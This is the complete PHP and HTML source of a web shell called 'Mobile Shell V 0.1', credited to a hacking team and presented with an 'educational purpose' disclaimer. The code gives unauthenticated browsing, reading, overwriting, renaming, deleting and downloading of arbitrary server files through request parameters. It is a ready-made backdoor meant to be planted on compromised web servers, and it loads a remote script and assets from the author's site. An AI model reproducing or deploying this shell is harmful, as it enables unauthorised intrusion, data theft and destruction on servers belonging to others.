<?php

/*
#Tools Name:
	Mobile Shell V 0.1 | The Alien

#Autor:
THIS TOOL IS CODED BY
IJAZ UR RAHIM (The Alien)
  From Team  P . C . G .

Changing Programmers name
doesn't mean You become 
the owner of it.

#Greetz to: 
Syed Umar Arfeen , Shoaib Malik , Usama Arshad , Zain Sabahat , Muhammad Osman and Team Pak Cyber Ghosts (https://www.facebook.com/pakcyberghostsofficial)

#Thanks to:
	php.net , w3schools.com , google.com and stackoverflow.com

#Languages used:
	HTML , CSS (Bootstrap as well) , JavaScript (JQuery most) and PHP

#Features:
	* Listing Files and Directories.
	* Show file type with a specific icon.
	* Show file's/dir's creation/modification time.
	* Show file's/dir's Permission.
	* Open Editor for a Specific Type of File.
	* Download File.
	* Delete File (also ask for confirmation).
	* Rename File.
	More Features will be add in next versions
#Contact:
	Facebook (https://www.facebook.com/muibraheem96)
	Website  (https://www.ijazurrahim.com/)
	Twitter  (https://www.twtiier.com/muibraheem96)
	linkedln (https://www.linkedin.com/in/muibraheem96/)
	instagram(https://www.instagram.com/muibraheem96/)
	GitHub   (https://www.github.com/IJAZ9913)
	Fiverr   (https://www.fiverr.com/muibraheem96)
	Email    (ijazkhan095@gmail.com)
*/
	function filemanager(){
		$files = '';
			$dirs = '';
			$dir = getcwd();
			$i=0;
			foreach(scandir($dir) as $key =>$value){
					$perm = permi($dir."/".$value);
			      	if (is_dir($value))
			      	{
			      		$j = $i;
			      		$info = pathinfo($dir."\\".$value);
			      		$name = $info['basename'];
			      		$newdir = str_replace("\\", "/", $dir);
						$getLastModDir = filemtime($value);
						$time = date("d/m/Y H:i ",$getLastModDir);
						$dirs .="<div class='folder' oncontextmenu='showinfo(\".fileinfo".$j++.",1\");return false;'>
									<img src='https://www.ijazurrahim.com/mobiShell/icons/folder.png' onClick='changedir(\"".$newdir."/".$name."\")' align='left' alt='' vspace='0'>
									<font class='fname' onClick='changedir(\"".$newdir."/".$name."\")'> &nbsp;".$name."</font><img src='https://www.ijazurrahim.com/mobiShell/icons/selection.png' class='foldermore' onclick='showinfo(\".fileinfo".--$j.",1\")' align='right'><br><br><font class='folderinfo'>&nbsp;&nbsp;".$time."</font> &nbsp;&nbsp;&nbsp;&nbsp;".$perm."</font><hr>
								</div>
								<div class='fileinfo hidden fileinfo".$i++."' >
									<li onclick='changedir(\"".$newdir."/".$name."\")'><div class='fileli'>Open</div></li>
									<li onclick='confirm_delete(\"".$newdir."/".$name."\")'><div class='fileli'>Delete</div></li>
									<li onclick='rename(\"".$newdir."\",\"".$name."\")'><div class='fileli'>Rename</div></li>
									<li onclick='cancelfileinfo()'><div class='fileli'>Cancel</div></li>
								</div>";
					}
					else
					{
						$info = pathinfo($dir."\\".$value);
			      		$newdir = str_replace("\\", "/", $dir);
			      		$name = $info['basename'];
			      		if(!$info['extension'])
			      		{
			      			$extension = "NULL";
			      			$file = "file";
			      		}
			      		else
			      		{
			      			$extension = $info['extension'];
			      			switch ($extension) {
			      				case "png":
			      				case "jpg":
			      				case "bmp":
			      				case "gif":
			      				case "jpeg":
			      				case "ico":
			      					$file = "image";
			      					break;
			      				case "txt":
			      					$file = "text";
			      					break;
			      				case "exe":
			      					$file = "binary";
			      					break;
			      				case "css":
			      					$file = "css";
			      					break;
			      				case "js":
			      					$file = "js";
			      					break;
			      				case "html":
			      					$file = "html";
			      					break;
			      				case "php":
			      					$file = "php";
			      					break;
			      				case "zip":
			      					$file = "zip";
			      					break;
			      				default:
			      					$file = "file";
			      					break;
			      			}
			      		}
			      		$j = $i;
			      		$open = '';
			      		$extensions = array("text/plain","text/x-php","text/html","text/css","application/javascript","application/json","application/xml","image/svg+xml","image/svg+xml","application/octet-stream");
			      		if (in_array(mime_content_type($value), $extensions)) 
			      			$open = 'onClick="openfile(\''.$newdir.'/'.$name.'\')"';
						$getLastModDir = filemtime($value);
						$time = date("d/m/Y H:i ",$getLastModDir);
						$files.='<div class="file" oncontextmenu="showinfo(\'.fileinfo'.$j++.',2\');return false;">
								<img src="https://www.ijazurrahim.com/mobiShell/icons/'.$file.'.png" '.$open.' class="fileic" align="left" alt="" vspace="0">
								<font id="fname" '.$open.'> &nbsp;'.$name.'</font><img src="https://www.ijazurrahim.com/mobiShell/icons/selection.png" onclick="showinfo(\'.fileinfo'.--$j.',2\')" class="foldermore" align="right"><br><br>
								<font class="folderinfo">&nbsp;&nbsp;'.$time.' Type: '.$extension.'</font> '.$perm.'</font><hr>
							</div>
							<div class="fileinfo hidden fileinfo'.$i++.'" >
								<li onclick="openeditora(\''.$newdir.'/'.$name.'\')"><div class="fileli">Edit</div></li>
								<li onclick="confirm_delete(\''.$newdir.'/'.$name.'\')"><div class="fileli">Delete</div></li>
								<li onclick="rename(\''.$newdir.'\',\''.$name.'\')"><div class="fileli">Rename</div></li>
								<li onclick="download(\''.$newdir.'/'.$name.'\')"><div class="fileli">Download</div></li>
								<li onclick="cancelfileinfo(\'.fileinfo'.$j++.'\')"><div class="fileli">Cancel</div></li>
							</div>';
					
				}
			}
			echo $dirs;
			echo $files;
	}
		if (isset($_POST['dir'])) {
			error_reporting(0);
			chdir($_POST['dir']);
			filemanager();
			die();
		}
		if (isset($_POST['file'])) {
			$dir = $_POST['file'];
			$info = pathinfo($_POST['file']);
			$content = htmlspecialchars(file_get_contents($_POST['file']));
			$name = $info['basename'];
			echo '
			<div class="editor-head"> 
				<font class="file-name">'.$name.'</font><font class="cross" onclick="closeeditor()">X</font>
			</div>
			<div class="editor-footer" onclick="save_file(\''.$dir.'\')">Save</div>
			<textarea rows=15 name="editor-body" class="editor-body col-xs-12">'.$content.'</textarea>';
		die();
		}
		if (isset($_POST['filename'])) 
		{
			$file = fopen($_POST['filepath'],'w');
			if(fwrite($file,htmlspecialchars_decode($_POST['filecontent'])))
			{
				echo 1;
			}
			else
			{
				echo $_POST['filecontent'];
			}
			fclose($file);
			die();
		}
		        function permi($directory){
	$perms = fileperms($directory);
   if (!is_readable($directory))
       $info = "<font color=red  class='folderinfo'> ";
   else
       $info = "<font color=green  class='folderinfo'> ";
switch ($perms & 0xF000) {
    case 0xC000: // socket
        $info .= 's';
        break;
    case 0xA000: // symbolic link
        $info .= 'l';
        break;
    case 0x8000: // regular
        $info .= 'r';
        break;
    case 0x6000: // block special
        $info .= 'b';
        break;
    case 0x4000: // directory
        $info .= 'd';
        break;
    case 0x2000: // character special
        $info .= 'c';
        break;
    case 0x1000: // FIFO pipe
        $info .= 'p';
        break;
    default: // unknown
        $info .= 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return($info);
}
if (isset($_GET['downfile'])) 
{
	$file = $_GET['downfile'];
if (file_exists($file)) 
{
    header('Content-Description: File Transfer');
    header('Content-Type: "'.mime_content_type($file).'"');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    die();
}
}
if (isset($_POST['oldname'])) 
{
	if(rename($_POST['newname'],$_POST['oldname']))
		echo 1;
	else
		echo 2;
	die();
}
if (isset($_POST['deletefile'])) 
{
	if(unlink($_POST['deletefile']))
		echo dirname($_POST['deletefile']);
	else
		echo 2;
}
?><!DOCTYPE HTML>
<html lang="en-US">
<head>
	<meta charset="UTF-8">
	<meta name="robots" content="index, follow"/>
	<meta name="rating" content="General"/>
	<meta name="revisit-after" content="1 day"/>
	<meta name="classification" content="Ijaz Ur Rahim"/>
	<meta name="keyword" content="Ijaz Ur Rahim,Young Programmer,Developer,Programmer,Young,Hacker,The Alien"/>
	<meta name="description" content="This Shell is coded by The Alien and is an open source, anyone can modify or edit the shell,This Shell is coded only for educational purpose and to make security researching more interesing,if anyone used it for illegal purpose then they are responsible"/>
	<meta name="googlebot" content="index,follow"/>
	<meta name="viewport" content="width=device-width, initial-scale=1.0 user-scalable=no">
	<meta name="robots" content="all"/>
	<meta name="robots schedule" content="auto"/>
	<meta name="distribution" content="global"/>
	<meta name="Author" content="Ijaz Ur Rahim">
	<title>Mobile Shell V 0.1 | The Alien</title>
	<meta http-equiv="imagetoolbar" content="no">
	<link rel="SHORTCUT ICON" href="https://ijazurrahim.com/mobiShell/icons/icon.png">
	<meta property="og:title" content="Mobile Shell V 0.1 | The Alien" />
	<link rel="canonical" href="https://www.ijazurrahim.com" />
	<meta property="og:url" content="https://www.ijazurrahim.com" />
	<meta property="og:image" content="https://www.ijazurrahim.com/mobiShell/icons/bg.png" />
	<meta property="og:description" content="This Shell is coded by The Alien and is an open source, anyone can modify or edit the shell,This Shell is coded only for educational purpose and to make security researching more interesing,if anyone used it for illegal purpose then they are responsible" />
	<meta property="og:type" content="website" />
	<link href="https://fonts.googleapis.com/css?family=Audiowide|Ceviche+One|Exo+2|Freckle+Face|Open+Sans|Roboto" rel="stylesheet" />
	<link rel="stylesheet" type="text/css" href="https://ijazurrahim.com/css/font-awesome/4.7.0/css/font-awesome.min.css" /> <!-- Bootstrap -->
    <link href="https://ijazurrahim.com/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://ijazurrahim.com/mobiShell/css/style.css" rel="stylesheet">
	<link rel="stylesheet" href="https://code.jquery.com/ui/1.11.4/themes/smoothness/jquery-ui.css">
 	<link rel="stylesheet" href="https://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" />

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <script src="https://ijazurrahim.com/js/jquery-3.2.1.min.js"></script>
	<script>
		
	</script>
</head>
<body onload="startTime()"> 
		<div class="col-lg-12 noti-bar">
			<div class="noti-icons">
				<img src="https://www.ijazurrahim.com/mobiShell/icons/battery.png" class="battery"><img src="https://www.ijazurrahim.com/mobiShell/icons/wifi.png" class="wifi"><span id="txt"></span>
			</div>
		</div>
		<div class="apps row ">
			<div class="col-lg-4 filemanager">
				<img src="https://www.ijazurrahim.com/mobiShell/icons/filemanager.png" alt="">
				<font>File Manager</font>
			</div>
		</div>
		<div class="explorer row hidden"><div class="crossfm alert label-danger" onclick="crossfm()">CLOSE</div><hr>
		<?php
			error_reporting(0);
			filemanager();
			?>
		</div>
		<div class="row editor col-lg-10 col-lg-offset-1 hidden">
			
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 file-error label-danger label">
			Error in Saving File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 file-success label-success label">
			File Saved Succesfully
		</div>
		<div class="rename col-xs-10 col-xs-offset-1 hidden">
			<div class="col-xs-12 oldname" contenteditable="true"></div>
			<div class="col-xs-12 newname" contenteditable="true"></div>
			<div class="col-xs-6 cancel btn btn-danger" onclick="hiderename()">Cancel</div>
			<div class="path hidden"></div>
			<div class="col-xs-6 rename-btn btn btn-success" onclick="renamefile()">Rename</div>
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 rename-error label-danger label">
			Error in Renaming File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 rename-success label-success label">
			File Renamed Succesfully
		</div>
		<div class="confirm-delete col-xs-10 col-xs-offset-1 hidden">
			<div class="col-xs-12 confirm">Are You sure to delete this file or directory?</div>
			<div class="filepath hidden"></div>
			<div class="col-xs-6 cancel btn btn-danger" onclick="hidedelete()">Cancel</div>
			<div class="col-xs-6 rename-btn btn btn-success" onclick="deletefile()">Delete</div>
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 delete-error label-danger label">
			Error in Deleting File
		</div>
		<div class="alert col-lg-2 col-md-2 col-xs-5 delete-success label-success label">
			File Deleted Succesfully
		</div>
<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="https://ijazurrahim.com/js/bootstrap.min.js"></script>
	<script src="https://code.jquery.com/jquery-1.10.2.js"></script>
    <script src="https://code.jquery.com/ui/1.11.4/jquery-ui.js"></script>
    <script src="https://ijazurrahim.com/js/jquery.ui.touch-punch.min.js"></script>
    <script>
    	function changedir(a)
		{
			var dir = a;
			$.post('mobiShell.php',
			 {dir: dir},
			 function(data) {
			 	$(".explorer").empty();
			 	$(".explorer").append('<div class="crossfm alert label-danger" onclick="crossfm()">CLOSE</div><hr>'+data);
			});
		}
		function closeeditor(){
			$( ".editor" ).addClass('hidden');
		}
		function save_file(c){
			var filename = $(".file-name").text();
			var filecontent = $('textarea').val();
			var filepath = c;
			$.post('mobiShell.php',
			 {filename: filename,filecontent:filecontent,filepath:filepath},
			 function(data) {
			 	if (data==1) {
			 		$(".file-success").show(1000);
			 		setTimeout(function() {
			 		$(".file-success").hide(1000);
			 		}, 2000);
			 	}
			 	if (data==2) {
			 		$(".file-error").show(1000);
			 		setTimeout(function() {
			 			$(".file-error").hide(1000);
			 		}, 2000);
			 	}
			});
		}
		function openfile(b){
			var file = b;
			$(".editor").empty();
			$.post('mobiShell.php',
			 {file: file},
			 function(data) {
			 	$(".editor").removeClass('hidden');
			 	$(".editor").append(data);
			});
		}
		function crossfm()
		{
			$(".explorer").addClass('hidden');
			$(".apps").removeClass('hidden');
		}
		function cancelfileinfo()
		{
			$(".fileinfo").addClass('hidden');
		}
		function openeditora(c)
		{
			$(".fileinfo").addClass('hidden');
			openfile(c);
		}
		function showinfo(d,e)
		{
			$(d).removeClass('hidden');
		}
		function download(f)
		{
			$(".fileinfo").addClass('hidden');
			var win = window.open('mobiShell.php?downfile='+f, '_blank');
			if (win) 
			{
				win.focus();
			}
			else
			{
				alert('Please Allow Pop Ups for this site and then Try again.')
			}
		}
		function hiderename()
		{
			$(".rename").addClass('hidden');
		}
		function hidedelete()
		{
			$(".confirm-delete").addClass('hidden');
		}
		function rename(g,h)
		{
			$(".rename").removeClass('hidden');
			$(".fileinfo").addClass('hidden');
			$(".oldname").text(h);
			$(".path").text(g);
		}
		function renamefile()
		{
			$(".rename").addClass('hidden');
			var oldname = $(".path").text()+"/"+$(".newname").text();
			var newname = $(".path").text()+"/"+$(".oldname").text();
			$.post('mobiShell.php',
			 {oldname: oldname,newname:newname},
			 function(data) {
			 	if(data==1)
			 	{
			 		changedir($(".path").text()+"/.");
			 		$(".rename-success").show(1000);
			 		setTimeout(function() {
			 		$(".rename-success").hide(1000);
			 		}, 2000);
			 	}
			 	if (data==2) 
			 	{
			 		$(".rename-error").show(1000);
			 		setTimeout(function() {
			 			$(".rename-error").hide(1000);
			 		}, 2000);
			 	}
			});
		}
		function confirm_delete(j)
		{
			$(".confirm-delete").removeClass('hidden');
			$(".fileinfo").addClass('hidden');
			$(".filepath").text(j);
		}
		function deletefile()
		{
			$(".confirm-delete").addClass('hidden');
			var deletefile = $(".filepath").text();
			$.post('mobiShell.php',
			 {deletefile: deletefile},
			 function(data) {
			 	if(data!=2)
			 	{
			 		changedir(data);
			 		$(".delete-success").show(1000);
			 		setTimeout(function() {
			 		$(".delete-success").hide(1000);
			 		}, 2000);
			 	}
			 	if (data==2) 
			 	{
			 		$(".delete-error").show(1000);
			 		setTimeout(function() {
			 			$(".delete-error").hide(1000);
			 		}, 2000);
			 	}
			});
		}
	    	if ($("html").width()>900){
			var win = window.open("https://ijazurrahim.com","_self"); 
			window.open("mobiShell.php","","width=500,height=800");
		}
</script>
	<script src="https://www.ijazurrahim.com/mobiShell/js/script.js"></script>
 
</head>
<body> 

  </body>
</html>
